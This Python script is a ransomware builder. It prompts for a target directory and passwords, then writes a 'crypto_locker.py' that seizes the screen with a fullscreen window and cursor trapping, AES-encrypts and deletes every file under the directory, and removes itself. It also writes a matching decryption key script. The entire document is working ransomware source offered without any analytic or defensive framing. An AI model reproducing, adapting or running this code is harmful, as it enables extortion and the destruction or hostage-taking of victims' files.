direct = input("Write the root directory: ")
pass_key = input("Write the password for crypter: ")
pass_locker = input("Write the password for locker: ")
print("#######################################")
with open("crypto_locker.py","w") as locker:
    locker.write('''from tkinter import Tk, Entry, Label
from pyautogui import click, moveTo
from threading import *
import sys, os, pyAesCrypt
from time import sleep
def locker():
    def callback(event):
        global k, entry
        if entry.get()=="'''+str(pass_locker)+'''":
            k=True
    def on_closing(void):
        click(675, 420)
        moveTo(675, 420)
        root.attributes("-fullscreen", True)
        root.protocol("WM_DELETE_WINDOW", on_closing)
        root.update()
        root.bind('<Control-KeyPress-c>', callback)
    global k, entry
    root =  Tk()
    root.title("Locker")
    root.attributes("-fullscreen", True)
    entry = Entry(root, font = 1)
    entry.place(width = 150, height = 50, x = 600, y = 400)
    label0 = Label(root, text = "Locker", font = 1)
    label0.grid(row = 0, column = 0)
    label1 = Label(root, text = "Write the Password and Press Ctrl+C", font="Arial 20")
    label1.place(x = 470, y = 300)
    root.update()
    sleep(0.2)
    click(675, 420)
    k = False
    while k != True:
        on_closing(None)
def crypter():
    def crypt(file):
        password = "'''+str(pass_key)+'''"
        bufferSize = 512*1024
        pyAesCrypt.encryptFile(str(file), str(file)+".crp", password,bufferSize)
        print("[crypted]"+str(file)+".crp")
        os.remove(file)
    def walk(dir):
        for name in os.listdir(dir):
            path = os.path.join(dir, name)
            if os.path.isfile(path):
                crypt(path)
            else: walk(path)
    walk("'''+str(direct)+'''")
    os.remove(str(sys.argv[0]))
thread_1 = Thread(target = locker)
thread_2 = Thread(target = crypter)
thread_1.start()
thread_2.start()
thread_1.join()
thread_2.join()
''')
print("[+] File 'crypto_locker.py' successfully saved!")
with open("crypto_key.py", "w") as key:
    key.write('''import os, sys
def decrypt(file):
    import pyAesCrypt
    password = "'''+str(pass_key)+'''"
    bufferSize = 512 * 1024
    pyAesCrypt.decryptFile(str(file), str(os.path.splitext(file)[0]), password, bufferSize)
    print("[decrypted] '"+str(os.path.splitext(file)[0])+"'")
    os.remove(file)
def walk(dir):
    for name in os.listdir(dir):
        path = os.path.join(dir, name)
        if os.path.isfile(path):
            try: decrypt(path)
            except: pass
        else: walk(path)
walk("'''+str(direct)+'''")
os.remove(str(sys.argv[0]))
''')

print("[+] File 'crypto_key.py' successfully saved!")
